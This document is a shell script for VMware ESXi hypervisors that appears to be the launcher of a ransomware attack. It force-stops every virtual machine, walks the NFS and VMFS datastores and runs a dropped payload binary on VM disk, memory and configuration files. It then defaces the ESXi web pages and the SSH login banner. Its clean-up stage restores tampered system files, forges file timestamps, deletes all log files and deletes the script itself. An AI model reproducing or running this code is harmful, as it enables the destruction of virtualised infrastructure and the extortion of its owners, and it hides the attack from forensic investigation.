#!/bin/sh


# ESXi
#
# Settings
TARGET_PATH="/vmfs/volumes"
PAYLOAD_DIR="/tmp"
PAYLOAD_NAME="164f8295_linux.elf"


#
# Functions
ExecPayload()
{
	echo "[*] Exec payload: $PAYLOAD_DIR/$PAYLOAD_NAME \"$1\""
	nohup $PAYLOAD_DIR/$PAYLOAD_NAME "$1" >/dev/null 2>&1&
}

SetLimits()
{
	ulimit -n $(ulimit -Hn)
	ulimit -p $(ulimit -Hp)
}

StopVMS()
{
	echo "[*] Stop VMS"
	esxcli --formatter=csv --format-param=fields=="WorldID" vm process list | awk -F "," 'NR > 1 {system("esxcli vm process kill --type=force --world-id=" $1)}'
	kill -9 $(ps | grep vmx | awk '{print $2}')
}

ScanNFS()
{
	IFS=$'\n'
	for nfs_volume in $(IFS='\n' esxcli storage nfs list | awk 'NR > 2 { print $1 }'); do
		IFS=$'\n'
		echo "[*] Scan NFS volume: $nfs_volume"
		for nfs_path in $(find "$TARGET_PATH/$nfs_volume/" -type f); do
			if [[ -f "$nfs_path" ]]; then
				ExecPayload $nfs_path
			fi
		done
	done
	IFS=$' '
}

ScanVMS()
{
	IFS=$'\n'
	for vm_volume in $(IFS="\n" esxcli storage filesystem list | grep "$TARGET_PATH/" | awk -F'  ' '{print $2}'); do
		IFS=$'\n'
		echo "[*] Scan VMS volume: $vm_volume"
		for vm_path in $(find "$TARGET_PATH/$vm_volume/" -type f -name "*.nvram" -o -name "*.vmdk" -o -name "*.vmem" -o -name "*.vmsd" -o -name "*.vmsn" -o -name "*.vmss" -o -name "*.vmx" -o -name "*.vmxf" -o -name "*.vswp"); do
			if [[ -f "$vm_path" ]]; then
				ExecPayload $vm_path
			fi
		done
	done
	IFS=$' '
}

ScanPath()
{
	IFS=$'\n'
	echo "[*] Scan path: $1"
	for path in $(find "$1" -type f); do
		IFS=$'\n'
		if [[ -f "$path" ]]; then
			ExecPayload "$path"
		fi
	done
	IFS=$' '
}

WaitPayload()
{
	PWC=$(ps | grep $PAYLOAD_NAME | grep -v grep | wc -l)
	while [[ $PWC -ne 0 ]]; do
		echo "[*] Wait payload: $PWC"
		sleep 1
		PWC=$(ps | grep $PAYLOAD_NAME | grep -v grep | wc -l)
	done
}

Deface()
{
	IFS=$'\n'
	for index_page in $(find /usr/lib/vmware -type f -name index.html); do
		index_page_path=$(dirname $index_page)
		echo "[*] Deface HTML: $index_page_path/index.html"
		mv "$index_page_path/index.html" "$index_page_path/index.html.backup"
		cp "$PAYLOAD_DIR/index.html" "$index_page_path/index.html"
	done
	IFS=$' '
	
	echo "[*] Deface SSH"
	mv /etc/motd /etc/motd.backup
	cp $PAYLOAD_DIR/motd /etc/motd
}

Post()
{
	echo "[*] Post"
	if [ -f "/sbin/hostd-probe.bak" ]; then
		rm -f /sbin/hostd-probe
		mv /sbin/hostd-probe.bak /sbin/hostd-probe
		touch -r /usr/lib/vmware/busybox/bin/busybox /sbin/hostd-probe
	fi

	cnt=$(/bin/vmware -l | grep " 7." | wc -l)
	if [[ $cnt -ne 0 ]]; then
		chmod +w /var/spool/cron/crontabs/root
		sed '$d' /var/spool/cron/crontabs/root > /var/spool/cron/crontabs/root.1
		sed '1,8d' /var/spool/cron/crontabs/root.1 > /var/spool/cron/crontabs/root.2
		rm -f /var/spool/cron/crontabs/root /var/spool/cron/crontabs/root.1
		mv /var/spool/cron/crontabs/root.2 /var/spool/cron/crontabs/root
		touch -r /usr/lib/vmware/busybox/bin/busybox /var/spool/cron/crontabs/root
		chmod -w /var/spool/cron/crontabs/root
	fi

	if [[ $cnt -eq 0 ]]; then
		sed '1d' /bin/hostd-probe.sh > /bin/hostd-probe.sh.1 && mv /bin/hostd-probe.sh.1 /bin/hostd-probe.sh
	fi

	sed '$d' /etc/vmware/rhttpproxy/endpoints.conf > /etc/vmware/rhttpproxy/endpoints.conf.1 && mv /etc/vmware/rhttpproxy/endpoints.conf.1 /etc/vmware/rhttpproxy/endpoints.conf
	echo '' > /etc/rc.local.d/local.sh
	touch -r /etc/vmware/rhttpproxy/config.xml /etc/vmware/rhttpproxy/endpoints.conf
	touch -r /etc/vmware/rhttpproxy/config.xml /bin/hostd-probe.sh
	touch -r /etc/vmware/rhttpproxy/config.xml /etc/rc.local.d/local.sh
}

Cleanup()
{
	echo "[*] Cleanup"
	find / -name *.log -exec rm -rf {} \;
	find $TARGET_PATH -type f -name *.*~ -exec rm -rf {} \;

	rm -f $PAYLOAD_DIR/$PAYLOAD_NAME $PAYLOAD_DIR/index.html $PAYLOAD_DIR/motd

	/bin/sh /bin/auto-backup.sh > /dev/null
	rm -- "$0"
}

StartSSH()
{
	echo "[*] Start SSH"
	/etc/init.d/SSH start
}


#
# Logic
chmod +x $PAYLOAD_DIR/$PAYLOAD_NAME
SetLimits

if [ $# -eq 1 ]; then
	echo "[*] Scan specified path: $1"
	ScanPath "$1"
	WaitPayload
else
	echo "[*] Scan generic paths"
	StopVMS
	ScanNFS
	ScanVMS
	WaitPayload
	Deface
	Post
	Cleanup
	StartSSH
fi

echo "[*] Done"
